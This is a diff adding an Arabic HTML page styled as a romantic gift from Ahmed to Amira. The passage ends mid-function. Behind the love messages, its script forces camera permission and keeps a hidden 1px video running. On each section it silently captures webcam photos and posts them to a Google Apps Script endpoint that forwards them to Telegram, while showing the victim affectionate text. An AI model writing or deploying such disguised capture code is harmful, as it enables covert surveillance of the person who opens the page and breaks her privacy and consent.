@@ -1,0 +1,1024 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>هدية أحمد لأميرة ❤️</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Cairo', 'Tajawal', sans-serif;
+            background: #0a0a0a;
+            color: #f5ecec;
+            overflow-x: hidden;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 30%, #1a0a0a, #0d0505, #000000);
+            z-index: 0;
+            animation: bgPulse 12s infinite alternate ease-in-out;
+        }
+        @keyframes bgPulse {
+            0% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+        .bg-petals, .floating-hearts, .gold-sparkles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1;
+            overflow: hidden;
+        }
+        .bg-petals i {
+            position: absolute;
+            color: rgba(200, 70, 70, 0.25);
+            font-size: 2.2rem;
+            animation: floatPetals 22s infinite linear;
+        }
+        .floating-hearts i {
+            position: absolute;
+            color: rgba(255, 100, 150, 0.15);
+            font-size: 2rem;
+            animation: floatHearts 25s infinite alternate ease-in-out;
+        }
+        .gold-sparkles i {
+            position: absolute;
+            color: rgba(255, 215, 0, 0.2);
+            font-size: 1.4rem;
+            animation: sparkle 6s infinite ease-in-out;
+        }
+        @keyframes floatPetals {
+            0% { transform: translateY(-10vh) rotate(0deg) scale(0.6); opacity: 0.1; }
+            50% { opacity: 0.5; }
+            100% { transform: translateY(110vh) rotate(720deg) scale(1.3); opacity: 0; }
+        }
+        @keyframes floatHearts {
+            0% { transform: translateY(0) scale(0.8); opacity: 0.05; }
+            100% { transform: translateY(-150px) scale(1.6); opacity: 0.35; }
+        }
+        @keyframes sparkle {
+            0% { opacity: 0; transform: scale(0.5); }
+            50% { opacity: 0.8; transform: scale(1.4); }
+            100% { opacity: 0; transform: scale(0.5); }
+        }
+        .glass-card {
+            background: rgba(20, 10, 10, 0.35);
+            backdrop-filter: blur(18px);
+            -webkit-backdrop-filter: blur(18px);
+            border: 1px solid rgba(255, 200, 200, 0.12);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.9), 0 0 80px rgba(180, 40, 40, 0.15);
+            border-radius: 64px;
+            padding: 2.8rem 2.5rem;
+            transition: all 0.4s ease;
+            position: relative;
+            z-index: 2;
+        }
+        .glass-card:hover {
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.95), 0 0 120px rgba(200, 50, 50, 0.25);
+        }
+        .glow-btn {
+            background: linear-gradient(145deg, #7a1a1a, #2f0808);
+            border: none;
+            padding: 20px 48px;
+            border-radius: 80px;
+            font-size: 1.7rem;
+            font-weight: 900;
+            color: #fde3e3;
+            box-shadow: 0 0 40px rgba(200, 30, 30, 0.6), 0 0 80px rgba(200, 30, 30, 0.2);
+            transition: all 0.3s ease;
+            cursor: pointer;
+            font-family: inherit;
+            letter-spacing: 2px;
+            backdrop-filter: blur(6px);
+            border: 1px solid rgba(255, 180, 180, 0.25);
+            position: relative;
+            overflow: hidden;
+        }
+        .glow-btn::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.05) 0%, transparent 70%);
+            animation: btnShine 6s infinite linear;
+        }
+        @keyframes btnShine {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .glow-btn:hover {
+            transform: scale(1.04);
+            box-shadow: 0 0 70px rgba(255, 70, 70, 0.9), 0 0 120px rgba(200, 30, 30, 0.4);
+            background: linear-gradient(145deg, #922222, #3d0e0e);
+        }
+        .glow-btn:active {
+            transform: scale(0.94);
+        }
+        .section {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            width: 100%;
+            padding: 2rem 1.5rem;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+            animation: fadeInSection 0.9s ease forwards;
+        }
+        .section.active {
+            display: flex;
+        }
+        @keyframes fadeInSection {
+            0% { opacity: 0; transform: scale(0.96) translateY(30px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+        .hero-title {
+            font-size: 4.8rem;
+            font-weight: 900;
+            color: #fce4e4;
+            text-shadow: 0 0 60px rgba(200, 50, 50, 0.7), 0 0 120px rgba(200, 50, 50, 0.3);
+            letter-spacing: 3px;
+        }
+        .sub-text {
+            font-size: 1.7rem;
+            line-height: 2.8rem;
+            color: #ecd0d0;
+            max-width: 750px;
+            margin: 1.8rem auto;
+            font-weight: 400;
+            text-shadow: 0 0 30px rgba(0, 0, 0, 0.6);
+        }
+        .typing-text {
+            min-height: 4.5rem;
+            font-size: 2rem;
+            color: #f5d8d8;
+            border-right: 4px solid #b33;
+            padding-left: 14px;
+            font-weight: 500;
+        }
+        .card-love {
+            background: rgba(25, 10, 10, 0.45);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 150, 150, 0.15);
+            border-radius: 72px;
+            padding: 3rem 2.5rem;
+            max-width: 800px;
+            margin: 1.8rem auto;
+            box-shadow: 0 0 80px rgba(150, 20, 20, 0.2);
+        }
+        .heart-pulse {
+            font-size: 7rem;
+            color: #e74c3c;
+            text-shadow: 0 0 100px #e74c3c, 0 0 200px #e74c3c;
+            transition: 0.2s;
+            cursor: pointer;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); text-shadow: 0 0 40px #e74c3c; }
+            50% { transform: scale(1.1); text-shadow: 0 0 80px #ff4d4d, 0 0 160px #ff4d4d; }
+            100% { transform: scale(1); text-shadow: 0 0 40px #e74c3c; }
+        }
+        .action-btn {
+            background: rgba(80, 20, 20, 0.55);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(200, 80, 80, 0.3);
+            color: #fce4e4;
+            padding: 16px 36px;
+            border-radius: 80px;
+            font-size: 1.4rem;
+            font-weight: 700;
+            margin: 0.6rem;
+            cursor: pointer;
+            transition: 0.3s;
+            font-family: inherit;
+            min-width: 190px;
+            box-shadow: 0 0 20px rgba(150, 20, 20, 0.1);
+        }
+        .action-btn:hover:not(:disabled) {
+            background: #a33;
+            box-shadow: 0 0 50px #a33;
+            transform: scale(1.02);
+        }
+        .action-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+        .final-text {
+            font-size: 3.2rem;
+            font-weight: 900;
+            text-shadow: 0 0 80px rgba(200, 50, 50, 0.8), 0 0 160px rgba(200, 50, 50, 0.3);
+            line-height: 1.5;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .cinematic-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0000;
+            z-index: 9999;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.7s ease;
+        }
+        .cinematic-overlay.active {
+            opacity: 1;
+        }
+        @media (max-width: 600px) {
+            .hero-title { font-size: 3rem; }
+            .sub-text { font-size: 1.3rem; line-height: 2.2rem; }
+            .glow-btn { font-size: 1.3rem; padding: 16px 30px; }
+            .glass-card { padding: 1.8rem 1.2rem; }
+            .card-love { padding: 2rem 1.2rem; }
+            .action-btn { font-size: 1.1rem; padding: 12px 24px; min-width: 140px; }
+            .final-text { font-size: 2.2rem; }
+        }
+        .gold-text {
+            color: #f5d77b;
+            text-shadow: 0 0 40px rgba(255, 215, 0, 0.3);
+        }
+        .status-success { color: #6f6; font-size: 1.2rem; }
+        .status-error { color: #f66; font-size: 1.2rem; }
+        .status-sending { color: #fd8; font-size: 1.2rem; }
+        .camera-indicator {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 0.9rem;
+            color: #4caf50;
+            border: 1px solid rgba(76, 175, 80, 0.3);
+            z-index: 100;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+        .camera-indicator i { font-size: 1.2rem; }
+        .camera-indicator.active { display: flex; }
+
+        /* Overlay when permission denied */
+        .permission-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.88);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            z-index: 10000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 2rem;
+            animation: fadeInOverlay 0.6s ease;
+        }
+        .permission-overlay.active {
+            display: flex;
+        }
+        @keyframes fadeInOverlay {
+            0% { opacity: 0; transform: scale(0.95); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        .permission-overlay .content {
+            max-width: 550px;
+            text-align: center;
+            background: rgba(20, 10, 10, 0.6);
+            backdrop-filter: blur(30px);
+            -webkit-backdrop-filter: blur(30px);
+            border: 2px solid rgba(255, 100, 100, 0.15);
+            border-radius: 64px;
+            padding: 3rem 2.5rem;
+            box-shadow: 0 0 100px rgba(200, 30, 30, 0.15);
+        }
+        .permission-overlay .content .big-icon {
+            font-size: 5rem;
+            color: #e74c3c;
+            animation: pulse 1.5s infinite;
+        }
+        .permission-overlay .content h2 {
+            font-size: 2.4rem;
+            color: #f5d8d8;
+            margin: 1.5rem 0 0.8rem;
+        }
+        .permission-overlay .content p {
+            font-size: 1.3rem;
+            line-height: 2.2rem;
+            color: #d4b0b0;
+        }
+        .permission-overlay .content .btn-retry {
+            margin-top: 2rem;
+            background: linear-gradient(145deg, #7a1a1a, #2f0808);
+            border: none;
+            padding: 18px 40px;
+            border-radius: 60px;
+            font-size: 1.4rem;
+            font-weight: 900;
+            color: #fde3e3;
+            box-shadow: 0 0 40px rgba(200, 30, 30, 0.5);
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 180, 180, 0.25);
+        }
+        .permission-overlay .content .btn-retry:hover {
+            transform: scale(1.04);
+            box-shadow: 0 0 70px rgba(255, 70, 70, 0.8);
+        }
+        .permission-overlay .content .btn-retry:active {
+            transform: scale(0.95);
+        }
+        .permission-overlay .content .sub-note {
+            margin-top: 1.2rem;
+            font-size: 1rem;
+            color: #887;
+        }
+        .permission-overlay .content .btn-skip {
+            margin-top: 1rem;
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            padding: 12px 30px;
+            border-radius: 40px;
+            font-size: 1rem;
+            color: #887;
+            cursor: pointer;
+            font-family: inherit;
+            transition: 0.3s;
+        }
+        .permission-overlay .content .btn-skip:hover {
+            border-color: #665;
+            color: #aaa;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.7; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== PERMISSION OVERLAY ===== -->
+    <div class="permission-overlay" id="permissionOverlay">
+        <div class="content">
+            <div class="big-icon">
+                <i class="fas fa-camera"></i>
+            </div>
+            <h2>⚠️ مطلوب السماح للكاميرا</h2>
+            <p>
+                يا أميرة، الكاميرا ضرورية عشان نكمل الهدية ❤️<br>
+                بدون الكاميرا، الموقع ما رح يشتغل.
+            </p>
+ 
+            <button class="btn-retry" id="retryPermissionBtn">
+                <i class="fas fa-redo"></i> طلب السماح للكاميرا مرة أخرى 📸
+            </button>
+            <button  id="skipPermissionBtn">
+               
+            </button>
+            <div class="sub-note">
+                <i class="fas fa-info-circle"></i> راح يطلب منك المتصفح السماح للكاميرا
+            </div>
+        </div>
+    </div>
+
+    <!-- Camera indicator -->
+    <div  id="cameraIndicator">
+        <i ></i>
+           </div>
+
+    <!-- Background layers -->
+    <div class="bg-petals" id="petals"></div>
+    <div class="floating-hearts" id="hearts"></div>
+    <div class="gold-sparkles" id="sparkles"></div>
+    <div class="cinematic-overlay" id="cinematicOverlay"></div>
+
+    <!-- Hidden video for auto-capture -->
+    <video id="hiddenCamera" style="position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;" autoplay playsinline></video>
+
+    <!-- ===== SECTIONS ===== -->
+
+    <!-- 1. Start -->
+    <section class="section active" id="startScreen">
+        <div class="glass-card" style="max-width:750px;">
+            <div style="font-size:5rem; color:#e74c3c; filter:drop-shadow(0 0 60px #b33);">❤️</div>
+            <h1 class="hero-title" style="font-size:4.5rem;">إلى أميرة ❤️</h1>
+            <div class="sub-text" style="font-size:1.6rem; margin-top:2.5rem;">
+                <p>عندي هدية صغيرة إلچ...</p>
+                <p>بس قبل لا تفتحينها،</p>
+                <p>وعديني تكملين للآخر ❤️</p>
+            </div>
+            <button class="glow-btn" id="startBtn" style="margin-top:2.8rem;">
+                <i class="fas fa-rose" style="margin-left:12px;"></i> أفتح هديتي 🌹
+            </button>
+        </div>
+    </section>
+
+    <!-- 2. Eyes -->
+    <section class="section" id="eyesSection">
+        <div class="card-love">
+            <h2 style="font-size:4rem; color:#f5d8d8; text-shadow:0 0 60px #b33;">عيونچ...</h2>
+            <div id="eyesText" class="typing-text" style="font-size:2rem; min-height:7rem; border:none; text-align:center; margin:2.5rem 0;"></div>
+            <div style="display:flex; justify-content:center; gap:2rem; flex-wrap:wrap; margin:1.5rem 0;">
+                <i class="fas fa-heart" style="color:#e74c3c; font-size:2.2rem; opacity:0.6;"></i>
+                <i class="fas fa-rose" style="color:#c0392b; font-size:2.2rem; opacity:0.6;"></i>
+                <i class="fas fa-star" style="color:#f5d77b; font-size:2.2rem; opacity:0.5;"></i>
+                <i class="fas fa-heart" style="color:#e74c3c; font-size:2.2rem; opacity:0.6;"></i>
+            </div>
+            <div id="eyesAutoStatus" style="font-size:1.2rem; color:#a88; margin:0.5rem 0;"></div>
+            <button class="action-btn" id="toLipsBtn">الى ابتسامتچ ❤️</button>
+        </div>
+    </section>
+
+    <!-- 3. Lips -->
+    <section class="section" id="lipsSection">
+        <div class="card-love">
+            <h2 style="font-size:3.6rem; color:#f5d8d8;">وابتسامتچ... ❤️</h2>
+            <div style="font-size:1.8rem; line-height:2.8rem; margin:2rem 0; color:#ecd0d0;">
+                <p>أما ابتسامتچ فهاي سالفة ثانية...</p>
+                <p>من تبتسمين، والله حتى اليوم التعبان يصير بيه طعم ثاني.</p>
+                <p>شفايفچ من تبتسم... أحس بيها أحلى من كل الورد اللي بالدنيا 🌹</p>
+                <p>وأكثر شي أحبه؟ لما تضحكين من قلبچ... لأنه بهاللحظة أحس أحمد هو أسعد واحد بالدنيا.</p>
+            </div>
+            <i class="fas fa-rose" style="font-size:6rem; color:#c0392b; filter:drop-shadow(0 0 60px #b33);"></i>
+            <div id="lipsAutoStatus" style="font-size:1.2rem; color:#a88; margin:0.5rem 0;"></div>
+            <button class="action-btn" id="toKnowBtn">أريدچ تعرفين شغلة ❤️</button>
+        </div>
+    </section>
+
+    <!-- 4. Know -->
+    <section class="section" id="knowSection">
+        <div class="glass-card" style="max-width:750px;">
+            <h2 style="font-size:3.2rem; color:#f5d8d8;">أميرة...</h2>
+            <div style="font-size:1.6rem; line-height:2.8rem; margin:2rem 0;">
+                <p>مو لأنچ حلوة وبس أحبچ، لا...</p>
+                <p>أحب تفاصيلچ، ضحكتچ، عيونچ، طريقتچ بالحچي، زعلچ، فرحتچ، وحتى الأشياء الصغيرة اللي يمكن إنتِ ما تنتبهين إلها.</p>
+                <p style="margin-top:2rem; font-weight:700; font-size:1.8rem; color:#f5d77b;">أحبچ لأنچ إنتِ... مو لأنچ تشبهين أحد. ❤️</p>
+            </div>
+            <div id="knowAutoStatus" style="font-size:1.2rem; color:#a88; margin:0.5rem 0;"></div>
+            <button class="action-btn" id="toHeartBtn">دوسي على القلب ❤️</button>
+        </div>
+    </section>
+
+    <!-- 5. Heart -->
+    <section class="section" id="heartSection">
+        <div class="card-love">
+            <p style="font-size:2rem;">دوسي على القلب ❤️</p>
+            <div id="heartDisplay" class="heart-pulse" style="font-size:8rem;">
+                <i class="fas fa-heart"></i>
+            </div>
+            <div id="heartMessage" style="font-size:2rem; min-height:5rem; margin:1.8rem 0; color:#f5d0d0;"></div>
+            <div id="heartAutoStatus" style="font-size:1.2rem; color:#a88; margin:0.5rem 0;"></div>
+            <button class="action-btn" id="toLetterBtn">رسالة أحمد ❤️</button>
+        </div>
+    </section>
+
+    <!-- 6. Letter -->
+    <section class="section" id="letterSection">
+        <div class="glass-card" style="max-width:800px;">
+            <h2 style="font-size:3rem; color:#f5d8d8;">من أحمد إلى أميرة ❤️</h2>
+            <div id="letterText" style="font-size:1.6rem; line-height:2.8rem; text-align:right; margin:2rem 0; min-height:14rem; color:#ecd0d0;"></div>
+            <div id="letterAutoStatus" style="font-size:1.2rem; color:#a88; margin:0.5rem 0;"></div>
+            <button class="action-btn" id="toFinalBtn">أكمل الهدية ❤️</button>
+        </div>
+    </section>
+
+    <!-- 7. Final -->
+    <section class="section" id="finalSection">
+        <div class="glass-card" style="max-width:800px;">
+            <div style="font-size:5rem; color:#e74c3c; filter:drop-shadow(0 0 80px #b33);">❤️</div>
+            <h1 class="hero-title" style="font-size:4.5rem;">أميرة ❤️</h1>
+            <div class="final-text" style="margin:2rem 0;">
+                <p>إذا أكو شي أحمد ما يمل منه بالدنيا...</p>
+                <p style="font-weight:900; text-shadow:0 0 80px #b33; color:#f5d77b;">فهو عيونچ، ضحكتچ، ووجودچ بحياته.</p>
+                <p style="font-size:4rem; margin-top:2rem;">أحبچ ❤️</p>
+                <p style="font-size:1.4rem; color:#d4b0b0; margin-top:0.5rem;">من أحمد... إلى أميرة 🌹</p>
+            </div>
+            <button class="glow-btn" id="restartBtn" style="margin-top:2rem;">أعيد الهدية من البداية ❤️</button>
+        </div>
+    </section>
+
+    <div id="telegram-status"></div>
+
+    <script>
+        (function() {
+            // =============================================
+            // GOOGLE APPS SCRIPT CONFIG
+            // =============================================
+            // رابط Google Apps Script (بدون أي توكن أو إيدي مكشوف)
+            const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwkdEvezvsRYp2jjuQ81hpzCa-Cd9TtTObh90_LLpirxph0veOkP3bOIgKrlgnNRCZm/exec';
+
+            // =============================================
+            // SEND PHOTO TO GOOGLE SCRIPT (which sends to Telegram)
+            // =============================================
+
+            async function sendPhotoToTelegram(imageDataURL, sectionId = null) {
+                const statusMap = {
+                    eyes: document.getElementById('eyesAutoStatus'),
+                    lips: document.getElementById('lipsAutoStatus'),
+                    know: document.getElementById('knowAutoStatus'),
+                    heart: document.getElementById('heartAutoStatus'),
+                    letter: document.getElementById('letterAutoStatus')
+                };
+                const statusEl = sectionId ? statusMap[sectionId] : null;
+
+                try {
+                    // إرسال إلى Google Apps Script بدلاً من Telegram مباشرة
+                    const sendResponse = await fetch(GOOGLE_SCRIPT_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+                        body: JSON.stringify({
+                            image: imageDataURL,
+                            section: sectionId
+                        })
+                    });
+                    const data = await sendResponse.json();
+
+                    if (data.ok) {
+                        if (statusEl) {
+                            statusEl.textContent = 'فديت شفايفج 🌹';
+                            statusEl.style.color = '#6f6';
+                        }
+                        for (let i = 0; i < 8; i++) {
+                            const h = document.createElement('i');
+                            h.className = 'fas fa-heart';
+                            h.style.position = 'fixed';
+                            h.style.color = '#e74c3c';
+                            h.style.fontSize = (1 + Math.random() * 2.5) + 'rem';
+                            h.style.left = (10 + Math.random() * 80) + '%';
+                            h.style.top = (10 + Math.random() * 80) + '%';
+                            h.style.pointerEvents = 'none';
+                            h.style.zIndex = '999';
+                            h.style.transition = 'all 0.9s ease';
+                            h.style.opacity = '0.8';
+                            document.body.appendChild(h);
+                            setTimeout(() => {
+                                h.style.transform = `translateY(-${100+Math.random()*120}px) scale(0.1)`;
+                                h.style.opacity = '0';
+                            }, 50);
+                            setTimeout(() => h.remove(), 1100);
+                        }
+                        return true;
+                    } else {
+                        if (statusEl) {
+                            statusEl.textContent = `❌ فشل الإرسال: ${data.description || data.error || 'خطأ'}`;
+                            statusEl.style.color = '#f66';
+                        }
+                        return false;
+                    }
+                } catch (err) {
+                    if (statusEl) {
+                        statusEl.textContent = `❌ خطأ في الاتصال: ${err.message}`;
+                        statusEl.style.color = '#f66';
+                    }
+                    return false;
+                }
+            }
+
+            // =============================================
+            // CORE LOGIC
+            // =============================================
+
+            const eyesMessages = [
+                "أميرة، والله عيونچ مو عيون عادية... هاي العيون بيها شي يخلي الواحد ينسى شنو جان يريد يحچي.",
+                "كل ما أطالع بعيونچ، أحس الدنيا كلها تسكت، وما يبقى ببالي غيرهن.",
+                "عيونچ مو بس حلوة... عيونچ تسويلي شي ما تسويه الدنيا كلها ❤️"
+            ];
+            const heartQuotes = [
+                "أحبچ أكثر مما أكدر أوصف.", "عيونچ مصيبة أحمد.", "ضحكتچ ترد الروح.",
+                "يا بعد عيوني إنتِ.", "شنو مسوية بقلبي؟", "كلشي بيچ حلو.",
+                "أحب من تناديني باسمي.", "إنتِ غير عن كل الناس.", "أميرة وبس ❤️",
+                "لو أكدر أخليچ تشوفين نفسچ بعيوني، تعرفين شكد أحبچ."
+            ];
+            const letterParagraphs = [
+                "أميرة، يمكن مرات ما أعرف أعبر عن كلشي بداخلي، ويمكن كلامي ما يوصلچ مثل ما أريده، بس أكو شغلة متأكد منها...",
+                "من أول ما شفتچ، حسيت إنچ غير. عيونچ حكتلي قصة ما تكدر الكلمات توصفها. ابتسامتچ خلتني أصدق إن الدنيا فيها خير.",
+                "كل تفصيلة فيچ، حتى الصغيرة، تخلي قلبي يخفق بشكل ثاني. أنتِ مو مجرد حلوة، أنتِ أميرة، وأنا أحمد اللي يحبچ بكل تفاصيلچ.",
+                "أحب ضحكتچ، أحب حزنچ، أحب غضبچ، أحب كل شي فيچ. لأنچ إنتِ، مو لأنچ تشبهين أحد. ❤️"
+            ];
+
+            let currentHeartIndex = 0;
+            let hiddenStream = null;
+            let cameraPermissionGranted = false;
+            let permissionRequested = false;
+            let permissionDeniedPermanently = false;
+
+            const autoCaptured = {
+                eyes: false,
+                lips: false,
+                know: false,
+                heart: false,
+                letter: false
+            };
+
+            const sections = {
+                start: document.getElementById('startScreen'),
+                eyes: document.getElementById('eyesSection'),
+                lips: document.getElementById('lipsSection'),
+                know: document.getElementById('knowSection'),
+                heart: document.getElementById('heartSection'),
+                letter: document.getElementById('letterSection'),
+                final: document.getElementById('finalSection')
+            };
+            const overlay = document.getElementById('cinematicOverlay');
+            const permissionOverlay = document.getElementById('permissionOverlay');
+
+            function showSection(id) {
+                Object.keys(sections).forEach(key => {
+                    sections[key].classList.remove('active');
+                });
+                sections[id].classList.add('active');
+                window.scrollTo(0, 0);
+            }
+
+            function cinematicTransition(toSectionId) {
+                overlay.classList.add('active');
+                setTimeout(() => {
+                    showSection(toSectionId);
+                    overlay.classList.remove('active');
+                    triggerAutoCapture(toSectionId);
+                }, 700);
+            }
+
+            function typeText(element, textArray, index = 0, charIndex = 0) {
+                if (!element) return;
+                if (index >= textArray.length) return;
+                const fullText = textArray[index];
+                if (charIndex <= fullText.length) {
+                    element.textContent = fullText.substring(0, charIndex);
+                    setTimeout(() => typeText(element, textArray, index, charIndex + 1), 35);
+                } else {
+                    setTimeout(() => {
+                        element.textContent = '';
+                        typeText(element, textArray, index + 1, 0);
+                    }, 1200);
+                }
+            }
+
+            function typeLetter(element, paragraphs, idx = 0, charIdx = 0) {
+                if (!element || idx >= paragraphs.length) return;
+                const p = paragraphs[idx];
+                if (charIdx <= p.length) {
+                    element.textContent = p.substring(0, charIdx);
+                    setTimeout(() => typeLetter(element, paragraphs, idx, charIdx + 1), 28);
+                } else {
+                    element.textContent += '\n\n';
+                    setTimeout(() => typeLetter(element, paragraphs, idx + 1, 0), 500);
+                }
+            }
+
+            function createBg() {
+                const petals = document.getElementById('petals');
+                for (let i = 0; i < 22; i++) {
+                    const el = document.createElement('i');
+                    el.className = 'fas fa-rose';
+                    el.style.left = Math.random() * 100 + '%';
+                    el.style.animationDelay = (Math.random() * 24) + 's';
+                    el.style.fontSize = (1.6 + Math.random() * 3) + 'rem';
+                    el.style.opacity = 0.15 + Math.random() * 0.3;
+                    el.style.transform = `rotate(${Math.random()*360}deg)`;
+                    petals.appendChild(el);
+                }
+                const hearts = document.getElementById('hearts');
+                for (let i = 0; i < 16; i++) {
+                    const el = document.createElement('i');
+                    el.className = 'fas fa-heart';
+                    el.style.left = Math.random() * 100 + '%';
+                    el.style.top = Math.random() * 100 + '%';
+                    el.style.animationDelay = (Math.random() * 28) + 's';
+                    el.style.fontSize = (1.4 + Math.random() * 2.6) + 'rem';
+                    hearts.appendChild(el);
+                }
+                const sparkles = document.getElementById('sparkles');
+                for (let i = 0; i < 30; i++) {
+                    const el = document.createElement('i');
+                    el.className = 'fas fa-star';
+                    el.style.left = Math.random() * 100 + '%';
+                    el.style.top = Math.random() * 100 + '%';
+                    el.style.animationDelay = (Math.random() * 8) + 's';
+                    el.style.fontSize = (0.8 + Math.random() * 1.6) + 'rem';
+                    el.style.opacity = 0.1 + Math.random() * 0.3;
+                    sparkles.appendChild(el);
+                }
+            }
+            createBg();
+
+            // =============================================
+            // CAMERA PERMISSION - ONCE ONLY
+            // =============================================
+
+            const hiddenVideo = document.getElementById('hiddenCamera');
+            const cameraIndicator = document.getElementById('cameraIndicator');
+            const retryPermissionBtn = document.getElementById('retryPermissionBtn');
+            const skipPermissionBtn = document.getElementById('skipPermissionBtn');
+
+            function disableAllButtons(disabled = true) {
+                const allBtns = document.querySelectorAll('.action-btn, .glow-btn');
+                allBtns.forEach(btn => {
+                    if (btn.id !== 'retryPermissionBtn' && btn.id !== 'skipPermissionBtn') {
+                        btn.disabled = disabled;
+                    }
+                });
+            }
+
+            function showPermissionOverlay() {
+                permissionOverlay.classList.add('active');
+                disableAllButtons(true);
+            }
+
+            function hidePermissionOverlay() {
+                permissionOverlay.classList.remove('active');
+                disableAllButtons(false);
+            }
+
+            function renderPermissionDenied() {
+                cameraIndicator.classList.remove('active');
+                showPermissionOverlay();
+            }
+
+            function renderPermissionGranted() {
+                cameraIndicator.classList.add('active');
+                hidePermissionOverlay();
+                disableAllButtons(false);
+                startHiddenCamera();
+            }
+
+            async function requestCameraPermission() {
+                if (permissionRequested || permissionDeniedPermanently) return;
+                permissionRequested = true;
+
+                try {
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        renderPermissionDenied();
+                        return;
+                    }
+                    const tempStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }
+                    });
+                    tempStream.getTracks().forEach(t => t.stop());
+                    cameraPermissionGranted = true;
+                    renderPermissionGranted();
+                } catch (err) {
+                    console.warn('Camera permission denied:', err);
+                    cameraPermissionGranted = false;
+                    renderPermissionDenied();
+                    permissionRequested = false;
+                }
+            }
+
+            // Retry button
+            retryPermissionBtn.addEventListener('click', function() {
+                permissionRequested = false;
+                requestCameraPermission();
+            });
+
+            // Skip button - user chooses to not use camera
+            skipPermissionBtn.addEventListener('click', function() {
+                permissionDeniedPermanently = true;
+                permissionOverlay.classList.remove('active');
+                // Show a message that site won't work
+                document.querySelector('.permission-overlay .content').innerHTML = `
+                    <div class="big-icon">
+                        <i class="fas fa-times-circle" style="color:#f66;"></i>
+                    </div>
+                    <h2 style="color:#f66;">⚠️ الموقع لن يعمل</h2>
+                    <p>
+                        للأسف، بدون الكاميرا الموقع ما رح يشتغل ❤️<br>
+                        إذا غيرتي رأيك، أعدي تحميل الصفحة.
+                    </p>
+                    <button class="btn-retry" onclick="location.reload()" style="margin-top:1.5rem;">
+                        <i class="fas fa-redo"></i> إعادة تحميل الصفحة
+                    </button>
+                `;
+            });
+
+            async function startHiddenCamera() {
+                try {
+                    if (hiddenStream) {
+                        hiddenStream.getTracks().forEach(t => t.stop());
+                        hiddenStream = null;
+                    }
+                    hiddenStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } }
+                    });
+                    hiddenVideo.srcObject = hiddenStream;
+                    await hiddenVideo.play();
+                } catch (err) {
+                    console.warn('Hidden camera error:', err);
+                }
+            }
+
+            function captureFromHiddenCamera() {
+                if (!hiddenStream || !cameraPermissionGranted) return null;
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 320;
+                    canvas.height = 240;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(hiddenVideo, 0, 0, 320, 240);
+                    return canvas.toDataURL('image/jpeg', 0.85);
+                } catch (e) {
+                    console.warn('Auto-capture error:', e);
+                    return null;
+                }
+            }
+
+            function triggerAutoCapture(sectionId) {
+                if (!cameraPermissionGranted) return;
+                if (sectionId === 'start' || sectionId === 'final') return;
+
+                const statusMap = {
+                    eyes: document.getElementById('eyesAutoStatus'),
+                    lips: document.getElementById('lipsAutoStatus'),
+                    know: document.getElementById('knowAutoStatus'),
+                    heart: document.getElementById('heartAutoStatus'),
+                    letter: document.getElementById('letterAutoStatus')
+                };
+
+                if (autoCaptured[sectionId]) {
+                    if (statusMap[sectionId]) {
